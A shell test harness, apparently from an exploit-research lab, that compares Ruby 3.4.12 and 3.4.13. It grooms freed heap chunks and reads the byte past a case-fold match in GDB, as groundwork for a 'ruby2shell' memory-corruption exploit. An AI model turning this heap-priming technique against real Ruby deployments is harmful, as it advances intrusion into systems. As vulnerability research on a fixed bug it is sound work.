#!/bin/sh
# Does a primed split unsorted remainder put a chosen fold byte at exact+1?
# Analysis-only, no app/wire/marker. Builds a tiny C extension for plain Ruby
# 3.4.12 (vulnerable) and 3.4.13 (fixed), fills a large freed chunk with each
# fold's second byte, splits it, then records match? and (on 3.4.12) reads the
# exact+1 byte in GDB at regexec.c:4278.
set -eu
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/../.." && pwd)
cd "$ROOT"
OUT="$ROOT/lab/build/evidence/casefold-splitprime"
mkdir -p "$OUT"
C="$ROOT/lab/repro/ruby2shell-casefold-splitprime.c"
RB="$ROOT/lab/repro/ruby2shell-casefold-splitprime.rb"
GDB="$ROOT/lab/repro/ruby2shell-casefold-splitprime.gdb"

for pair in 3.4.12:312 3.4.13:313; do
  v=${pair%%:*}; t=${pair##*:}
  R="$ROOT/lab/build/plain/ruby-$v-plain"
  D="$ROOT/lab/build/casefold-splitprime-$t"
  mkdir -p "$D"
  gcc -shared -fPIC -O0 -g \
    -I"$ROOT/lab/build/ruby-$v" \
    -I"$R/include/ruby-3.4.0" \
    -I"$R/include/ruby-3.4.0/x86_64-linux" \
    -o "$D/ruby2shell_casefold_splitprime.so" "$C"
done

: > "$OUT/plain.txt"
for pair in 3.4.12:312 3.4.13:313; do
  v=${pair%%:*}; t=${pair##*:}
  R="$ROOT/lab/build/plain/ruby-$v-plain/bin/ruby"
  S="$ROOT/lab/build/casefold-splitprime-$t/ruby2shell_casefold_splitprime.so"
  for geom in 8192:256 8192:512 65536:256 65536:4096; do
    big=${geom%%:*}; front=${geom##*:}
    for tune in default no-tcache; do
      if [ "$tune" = no-tcache ]; then
        GLIBC_TUNABLES=glibc.malloc.tcache_count=0 \
          "$R" "$RB" "$S" "$big" "$front" 1 >> "$OUT/plain.txt"
      else
        "$R" "$RB" "$S" "$big" "$front" 1 >> "$OUT/plain.txt"
      fi
    done
  done
done

R312="$ROOT/lab/build/plain/ruby-3.4.12-plain/bin/ruby"
S312="$ROOT/lab/build/casefold-splitprime-312/ruby2shell_casefold_splitprime.so"
for geom in 8192:256 8192:512 65536:256; do
  big=${geom%%:*}; front=${geom##*:}
  for tune in default no-tcache; do
    log="$OUT/gdb-$big-$front-$tune.log"
    if [ "$tune" = no-tcache ]; then
      GLIBC_TUNABLES=glibc.malloc.tcache_count=0 gdb -q -batch -x "$GDB" --args \
        "$R312" "$RB" "$S312" "$big" "$front" 1 > "$log" 2>&1 || true
    else
      gdb -q -batch -x "$GDB" --args \
        "$R312" "$RB" "$S312" "$big" "$front" 1 > "$log" 2>&1 || true
    fi
    printf '== %s/%s/%s hits=%s ==\n' "$big" "$front" "$tune" "$(grep -c FOLD_HIT "$log" || true)"
    grep -E 'PRIME |FOLD_HIT n=' "$log" | head -20 || true
  done
done

echo '== plain outcomes (true / total) =='
grep -o 'match=[a-z]*' "$OUT/plain.txt" | sort | uniq -c
echo '== true rows =='
grep 'match=true' "$OUT/plain.txt" || true
